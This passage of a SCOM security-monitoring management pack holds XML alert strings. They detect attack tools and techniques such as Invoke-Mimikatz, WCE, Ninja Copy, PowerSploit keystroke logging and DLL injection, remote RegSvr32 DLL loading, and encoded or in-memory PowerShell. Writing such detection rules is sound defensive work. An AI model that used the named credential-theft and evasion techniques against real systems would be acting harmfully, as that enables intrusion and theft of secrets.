        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.PowerShellStartHiddenProcess.AlertMessage">
          <Name>Security Monitoring ForwardedEvents:  A Hidden Process was Created</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokeRemoteExpression">
          <Name>Security Monitoring Forwarded Events:  PowerShell used to Invoke a Remote Expression</Name>
          <Description>This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details. </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokeRemoteExpression.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  PowerShell used to Invoke a Remote Expression</Name>
          <Description>
            This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}

            Calling Application: {4}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokeEncodedCommand">
          <Name>Security Monitoring Forwarded Events:  PowerShell used to Invoke an Encoded Command</Name>
          <Description>One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokeEncodedCommand.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  PowerShell used to Invoke an Encoded Command</Name>
          <Description>
            One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}

            Calling Application: {4}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.PowerShellRuninMemoryOnly">
          <Name>Security Monitoring Forwarded Events:  PowerShell Running Only in Memory</Name>
          <Description>There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.PowerShellRuninMemoryOnly.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  PowerShell Running Only in Memory</Name>
          <Description>
            There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}

            Calling Application: {4}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.RemoteRegSvr32">
          <Name>Security Monitoring Forwarded Events:  RegSvr32 used to load a DLL that is not located on this machine</Name>
          <Description>A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details. </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.RemoteRegSvr32.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  RegSvr32 used to load a DLL that is not located on this machine</Name>
          <Description>
            A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.
            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.DistributedApplicationMS.DataSource" SubElementID="IntervalSeconds">
          <Name>Interval Seconds</Name>
          <Description>Interval between discovery (in seconds)</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Modules.SecurityLogClear.DS" SubElementID="AutoAccount">
          <Name>Auto Account</Name>
          <Description>Auto Account</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SMBv1Connections.DS" SubElementID="IntervalSeconds">
          <Name>Interval Seconds</Name>
          <Description>Interval between discoveries (in seconds)</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SMBv1Connections.DS" SubElementID="SyncTime">
          <Name>Sync time</Name>
          <Description>Time of day at which discovery will run</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SMBv1Connections.DS" SubElementID="TimeOut">
          <Name>Time Out</Name>
          <Description>Script Time Out (seconds)</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AuditPol.DS" SubElementID="IntervalSeconds">
          <Name>Interval Seconds</Name>
          <Description>Time between discovery (in seconds)</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AuditPol.DS" SubElementID="SyncTime">
          <Name>Sync Time</Name>
          <Description>Time of day at which discovery will run</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.DistributedApplication.DataSource" SubElementID="IntervalSeconds">
          <Name>Interval Seconds</Name>
          <Description>Time between executions (in seconds)</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.MultiStringRegistry.DS" SubElementID="IntervalSeconds">
          <Name>Interval Seconds</Name>
          <Description>Interval between executions (in seconds)</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityMonitoringDA" SubElementID="DomainDnsName">
          <Name>Domain DNS Name</Name>
          <Description>Domain DNS Name</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Discoveries.DiscoverWriteableFileLocations" SubElementID="FrequencyInSeconds">
          <Name>Frequency In Seconds</Name>
          <Description>Frequency In Seconds</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Discoveries.DiscoverWriteableFileLocations" SubElementID="AdditionalLocations">
          <Name>Additional Locations</Name>
          <Description>Additional Locations</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Discoveries.DiscoverWriteableFileLocations" SubElementID="TimeOutSeconds">
          <Name>Time Out Seconds</Name>
          <Description>Script Timout in Seconds</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoring.Event.RepeatedFailedLogind.DS" SubElementID="IntervalSeconds">
          <Name>Interval Seconds</Name>
          <Description>Script Interval in Seconds</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoring.Event.RepeatedFailedLogind.DS" SubElementID="Count">
          <Name>Count</Name>
          <Description>Count of Repeat Failed Logins</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.4688CommandAudit.DS" SubElementID="OverrideablePath6">
          <Name>Overrideable Path (6)</Name>
          <Description>Path to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.SuspiciousUserContext.DS" SubElementID="OverrideableExe1">
          <Name>Overrideable Exe (1)</Name>
          <Description>Executable to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.SuspiciousUserContext.DS" SubElementID="OverrideableExe2">
          <Name>Overrideable Exe (2)</Name>
          <Description>Exe to exclude from alerting</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.SuspiciousUserContext.DS" SubElementID="OverrideableExe3">
          <Name>Overrideable Exe (3)</Name>
          <Description>Exe to exclude from Alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.SuspiciousUserContext.DS" SubElementID="OverrideableExe4">
          <Name>Overrideable Exe (4)</Name>
          <Description>Exe to Exclude form Alerting</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.SuspiciousUserContext.DS" SubElementID="OverrideableExe5">
          <Name>Overrideable Exe (5)</Name>
          <Description>Exe to exclude from Alerting</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.SuspiciousUserContext.DS" SubElementID="OverrideableExe6">
          <Name>Overrideable Exe (6)</Name>
          <Description>Exe to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WriteableDirectories.DS" SubElementID="OverrideableExe1">
          <Name>Overrideable Exe (1)</Name>
          <Description>Exe to exclude from Alerting</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WriteableDirectories.DS" SubElementID="OverrideableExe2">
          <Name>Overrideable Exe (2)</Name>
          <Description>Exe to exclude from Alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WriteableDirectories.DS" SubElementID="OverrideableExe3">
          <Name>Overrideable Exe (3)</Name>
          <Description>Exe to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WriteableDirectories.DS" SubElementID="OverrideableFilePath1">
          <Name>Overrideable File Path (1)</Name>
          <Description>Path to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WriteableDirectories.DS" SubElementID="OverrideableFilePath2">
          <Name>Overrideable File Path (2)</Name>
          <Description>Path to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WriteableDirectories.DS" SubElementID="OverrideableFilePath3">
          <Name>Overrideable File Path (3)</Name>
          <Description>Path to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WriteableDirectoriesExtended.DS" SubElementID="OverrideableExe1">
          <Name>Overrideable Exe (1)</Name>
          <Description>Exe to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AuditPolMonitorType" SubElementID="IntervalSeconds">
          <Name>Interval Seconds</Name>
          <Description>Script interval in seconds</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AuditPolMonitorType" SubElementID="SyncTime">
          <Name>Sync Time</Name>
          <Description>Execution time for script</Description>
        </DisplayString>
        <DisplayString ElementID="MultiStringRegMonitorType" SubElementID="IntervalSeconds">
          <Name>Interval Seconds</Name>
          <Description>Script interval in seconds</Description>
        </DisplayString>
        <DisplayString ElementID="MultiStringRegMonitorType" SubElementID="SyncTime">
          <Name>Sync Time</Name>
          <Description>Time to execute script</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.LocalAccountChange.DS" SubElementID="SID1">
          <Name>Override SID (1)</Name>
          <Description>Exclude SID</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.LocalAccountChange.DS" SubElementID="SID2">
          <Name>Override SID (2)</Name>
          <Description>SID to Exclude</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.LocalAccountChange.DS" SubElementID="SID3">
          <Name>Override SID (3)</Name>
          <Description>SID to exclude</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.LocalAccountChange.DS" SubElementID="SID4">
          <Name>Override SID (4)</Name>
          <Description>Exclude SID</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.LocalAccountChange.DS" SubElementID="SID5">
          <Name>Override SID (5)</Name>
          <Description>Exclude SID</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ScheduledTaskCreation.DS" SubElementID="App1">
          <Name>Override App (1)</Name>
          <Description>Exclude App</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ScheduledTaskCreation.DS" SubElementID="App2">
          <Name>Override App (2)</Name>
          <Description>Exclude App</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ScheduledTaskCreation.DS" SubElementID="App3">
          <Name>Override App (3)</Name>
          <Description>Exclude App</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ScheduledTaskCreation.DS" SubElementID="App4">
          <Name>Override App (4)</Name>
          <Description>Exclude App</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ScheduledTaskCreation.DS" SubElementID="App5">
          <Name>Override App (5)</Name>
          <Description>Exclude App</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.MultiStringRegistry.DS" SubElementID="SyncTime">
          <Name>Sync Time</Name>
          <Description>Time to execute script</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.DCServiceCreation.DS" SubElementID="App1">
          <Name>Override App (1)</Name>
          <Description>Exclude App</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.DCServiceCreation.DS" SubElementID="App3">
          <Name>Override App (3)</Name>
          <Description>Exclude App</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.4688CommandAudit.DS" SubElementID="OverrideablePath1">
          <Name>Overrideable Path (1)</Name>
          <Description>Path to exclude from alerting</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.4688CommandAudit.DS" SubElementID="OverrideablePath2">
          <Name>Overrideable Path (2)</Name>
          <Description>Path to exclude from Alerting</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.4688CommandAudit.DS" SubElementID="OverrideablePath3">
          <Name>Overrideable Path (3)</Name>
          <Description>Path to exclude from Alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.4688CommandAudit.DS" SubElementID="OverrideablePath4">
          <Name>Overrideable Path (4)</Name>
          <Description>Path to Exclude from Alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.4688CommandAudit.DS" SubElementID="OverrideablePath5">
          <Name>Overrideable Path (5)</Name>
          <Description>Path to Exclude from Alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.DCServiceCreation.DS" SubElementID="App2">
          <Name>Overrideable App (2)</Name>
          <Description>App to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.DCServiceCreation.DS" SubElementID="App4">
          <Name>Overrideable App (4)</Name>
          <Description>App to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.DCServiceCreation.DS" SubElementID="App5">
          <Name>Overrideable App (5)</Name>
          <Description>App to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WriteableDirectoriesExtended.DS" SubElementID="OverrideableExe2">
          <Name>Overrideable Exe (2)</Name>
          <Description>Exe to Exclude from Alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WriteableDirectoriesExtended.DS" SubElementID="OverrideableExe3">
          <Name>Overrideable Exe (3)</Name>
          <Description>Exe to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WriteableDirectoriesExtended.DS" SubElementID="OverrideableFilePath1">
          <Name>Overrideable File Path (1)</Name>
          <Description>File Path to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WriteableDirectoriesExtended.DS" SubElementID="OverrideableFilePath2">
          <Name>Overrideable File Path (2)</Name>
          <Description>Path to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.WriteableDirectoriesExtended.DS" SubElementID="OverrideableFilePath3">
          <Name>Overrideable File Path (3)</Name>
          <Description>Path to exclude from alerting.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AccountLogonForDC">
          <Name>Security Monitoring: Logon/Logoff Setting on Domain Controllers</Name>
          <Description>This Dependency monitor tracks "Logon" audit setting on DCs.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AccountLogonForMS">
          <Name>Security Monitoring: Logon/Logoff Setting on Member Serverss</Name>
          <Description>This Dependency monitor tracks "Logon" audit setting on Member Servers.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Monitors.AuthenticationPackages">
          <Name>Security Monitoring: Check Authentication Packages Registry Key</Name>
          <Description>Description for the new unit monitor.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Monitors.AuthenticationPackages.AlertMessage">
          <Name>Security Monitoring: Check Authentication Packages Registry Key</Name>
          <Description>In order to establish persistence, and attacker can modify the OS Authentication Package binaries to use their own malware. See https://attack.mitre.org/wiki/Technique/T1131 for details. The key in question is HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages. The value of this key should only be msv1_0</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Monitors.AuthenticationPackages" SubElementID="RegValueBad">
          <Name>RegValueBad</Name>
          <Description>RegValueBad</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.Monitors.AuthenticationPackages" SubElementID="RegValueGood">
          <Name>RegValueGood</Name>
          <Description>RegValueGood</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.IncludeCommandLineProcessCreationonMS">
          <Name>Security Monitoring: Include Command Line for Process Auditing Setting on Member Servers</Name>
          <Description>This monitor will look at the registry key that needs to be set to include command line in 4688 events</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.IncludeCommandLineProcessCreationonMS" SubElementID="RegValueBad">
          <Name>RegValueBad</Name>
          <Description>RegValueBad</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.IncludeCommandLineProcessCreationonMS" SubElementID="RegValueGood">
          <Name>RegValueGood</Name>
          <Description>RegValueGood</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.IncludeCommandLineProcessCreationonDCs">
          <Name>Security Monitoring: Include Command Line for Process Auditing Setting on DCs</Name>
          <Description>This monitor will look at the registry key that needs to be set to include command line in 4688 events</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.IncludeCommandLineProcessCreationonDCs" SubElementID="RegValueBad">
          <Name>RegValueBad</Name>
          <Description>RegValueBad</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.IncludeCommandLineProcessCreationonDCs" SubElementID="RegValueGood">
          <Name>RegValueGood</Name>
          <Description>RegValueGood</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.DCDirectoryServicesAudit">
          <Name>Security Monitoring:  Directory Service Changes Setting on Domain Controllers</Name>
          <Description>This Dependency monitor tracks "Directory Service Changes" audit setting on DCs.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.DCAuditSettings">
          <Name>Security Monitoring Domain Controller Auditing Settings</Name>
          <Description>Auditing roll up for Domain Controllers</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.MemberServerAuditSettings">
          <Name>Security Monitoring Member Server Auditing Settings</Name>
          <Description>Auditing rollup for Member Servers</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.MemberServerProcessCreation">
          <Name>Security Monitoring:  Process Auditing Setting on Member Servers</Name>
          <Description>This Dependency monitor tracks "Process Creating" audit setting on Member Servers.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityGroupManagementforDC">
          <Name>Security Monitoring:  Security Group Management Audit Setting on Domain Controllers</Name>
          <Description>This Dependency monitor tracks "Security Group Management" audit setting on DCs.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.UserAcctforMS">
          <Name>Security Monitoring:  User Account Management Audit Setting on Member Servers</Name>
          <Description>This Dependency monitor tracks "User Account Management" audit setting on DCs.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.DCConfigGroupRollup">
          <Name>Security Monitoring:  Process Auditing Setting on Domain Controllers</Name>
          <Description>This Dependency monitor tracks "Process Creating" audit setting on DCs.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SpecialGroupLogonDC">
          <Name>Security Monitoring:  Special Group Logon Setting on Domain Controllers</Name>
          <Description>This Dependency monitor tracks "Special Logon" audit setting on DCs.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SpecialGroupLogonMS">
          <Name>Security Monitoring:  Special Group Logon Setting on Member Servers</Name>
          <Description>This Dependency monitor tracks "Special Logon" audit setting on DCs.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.FindAVSignature">
          <Name>Security Monitoring:  PowerSploit FindAV Signature Tool is in Use</Name>
          <Description>Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.FindAVSignature.AlertMessage">
          <Name>Security Monitoring:  PowerSploit FindAV Signature Tool is in Use</Name>
          <Description>Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.GetDLLLoadPath">
          <Name>Security Monitoring:  Powersploit Get DLL Load Path is in Use</Name>
          <Description>Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.GetDLLLoadPath.AlertMessage">
          <Name>Security Monitoring:  Powersploit Get DLL Load Path is in Use</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for details.
            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.GetHTTPStatus">
          <Name>Security Monitoring:  PowerSploit HTTP Path Discovery Tool is in Use</Name>
          <Description>This tool is used to dictionary a web server to determine the status of a path.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.GetHTTPStatus.AlertMessage">
          <Name>Security Monitoring:  PowerSploit HTTP Path Discovery Tool is in Use</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.GetKeystroke">
          <Name>Security Monitoring:  PowerSploit Key Stroke Logger in Use</Name>
          <Description>This is a PowerSploit tool that can be used to log key strokes.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.GetKeystroke.AlertMessage">
          <Name>Security Monitoring:  PowerSploit Key Stroke Logger in Use</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokeDLLInjection">
          <Name>Security Monitoring Forwarded Events:  PowerSploit Invoke DLL Injection Command in Use</Name>
          <Description>A Powersploit tool used to inject code into DLL files is in use in the environment.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ForwardedEvents.InvokeDLLInjection.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  PowerSploit Invoke DLL Injection Command in Use</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.InvokeMimikatzInUse">
          <Name>Security Monitoring:  Invoke-Mimikatz is in Use.</Name>
          <Description>Description for the new alert rule.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.InvokeMimikatzInUse.AlertMessage">
          <Name>Security Monitoring: Invoke-Mimikatz in use</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.InvokeNinjaCopy">
          <Name>Security Monitoring:  Invoke Ninja Copy is in Use</Name>
          <Description>This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.InvokeNinjaCopy.AlertMessage">
          <Name>Security Monitoring:  Invoke Ninja Copy is in Use</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.InvokePortScan">
          <Name>Security Monitoring:  Invoke Portscan is in Use</Name>
          <Description>This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.InvokePortScan.AlertMessage">
          <Name>Security Monitoring:  Invoke Portscan is in Use</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.InvokeShellCodeInUse">
          <Name>Security Monitoring:  Invoke ShellCode in Use</Name>
          <Description>Description for the new alert rule.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.InvokeShellCodeInUse.AlertMessage">
          <Name>Security Monitoring:  Invoke ShellCode is in Use</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.PowerShellStartHiddenProcess">
          <Name>Security Monitoring:  Hidden Process Starting Using PowerShell</Name>
          <Description>Description for the new alert rule.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.PowerShellLog.PowerShellStartHiddenProcess.AlertMessage">
          <Name>Security Monitoring:  A Hidden Process was Created</Name>
          <Description>
            See https://nathangau.wordpress.com/2017/05/24/security-monitoring-mp-powershell-exploit-toolkit-rules/ for links to the tools and additional details.

            Logging Computer: {0}

            User Name: {1}

            Event Description: {2}
          </Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring">
          <Name>Security Monitoring</Name>
          <Description>
            All documentation can be found at the following page:
            https://nathangau.wordpress.com/2017/05/01/introducing-the-security-monitoring-management-pack-for-scom/
          </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Folder.SecurityMonitoring">
          <Name>Security Monitoring</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Folder.Administration">
          <Name>Administration</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.View.DCDistributedApp">
          <Name>Domain Controller Audit Settings</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.View.MemberServerDistributedApp">
          <Name>Member Server Audit Settings</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.PSExec">
          <Name>Security Monitoring:  PSEXEC in Use</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.PSExec.AlertMessage">
          <Name>Security Monitoring:  PSEXEC in Use</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.PSExec" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.PSExec" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.View.SecurityMonitoringAlerts">
          <Name>Security Monitoring MP Alerts</Name>
          <Description>These may be legitimate alerts, but they should be investigated</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.WCE">
          <Name>Security Monitoring:  WCE in Use</Name>
          <Description>WCE is a credential theft too used to perform pass the hash attacks and enumerate wdigest passwords if this is turned on in your environment.  Other than penetration testing, there is little reason for this tool to exist in your environment.  This should be investigated immediately.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.WCE.AlertMessage">
          <Name>Security Monitoring:  WCE in Use</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.Mimikatz">
          <Name>Security Monitoring:  Mimikatz in use</Name>
          <Description>Mimikatz is a credential theft tool used for pass the hash attacks.  This should not be present in your environment.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.APPLocker.Mimikatz.AlertMessage">
          <Name>Security Monitoring:  Mimikatz in use</Name>
